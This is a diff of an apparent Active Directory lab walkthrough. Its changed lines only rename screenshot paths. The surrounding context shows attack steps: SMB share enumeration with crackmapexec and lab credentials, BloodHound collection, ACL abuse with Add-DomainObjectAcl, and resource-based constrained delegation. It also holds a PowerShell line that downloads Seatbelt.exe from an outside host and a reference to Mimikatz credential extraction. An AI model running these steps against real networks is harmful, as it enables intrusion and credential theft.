@@ -131,7 +131,7 @@ The account can access three hosts over SMB but unfortunately we aren't local ad
 crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 ```
 
-![](<../../../.gitbook/assets/image (54) (1).png>)
+![](<../../../.gitbook/assets/image (54) (1) (1).png>)
 
 The IPC$, NETLOGON and SYSVOL shares are default. There is one interesting share with the name `Data` on `FILE01`. After connecting to the share with smbclient we see that this user unfortunately can't access any of the subdirectories:
 
@@ -583,7 +583,7 @@ We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou
 nslookup secure.local
 ```
 
-![](<../../../.gitbook/assets/image (65) (1).png>)
+![](<../../../.gitbook/assets/image (65) (1) (1).png>)
 
 2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:
 
@@ -591,7 +591,7 @@ nslookup secure.local
 crackmapexec smb 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (64) (1).png>)
+![](<../../../.gitbook/assets/image (64) (1) (1).png>)
 
 3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:
 
@@ -668,7 +668,7 @@ Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure
 
 9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
 
-![](<../../../.gitbook/assets/image (65).png>)
+![](<../../../.gitbook/assets/image (65) (1).png>)
 
 10\. We have a lot of permissions now. Since `DATA01` doesn't have LAPS installed unfortunately, we need to execute another Resource Based Constrained Delegation attack. The one known as the computer object takeover. To execute this attack there are two requirements:
 
@@ -792,7 +792,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/Seatbelt.exe","C:\users\publi
 
 2\. In the output of the section WindowsCredentialFiles we can see that the user `sa_sql` has some credentials saved:
 
-![](<../../../.gitbook/assets/image (17) (1).png>)
+![](<../../../.gitbook/assets/image (17) (1) (1).png>)
 
 4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:
 
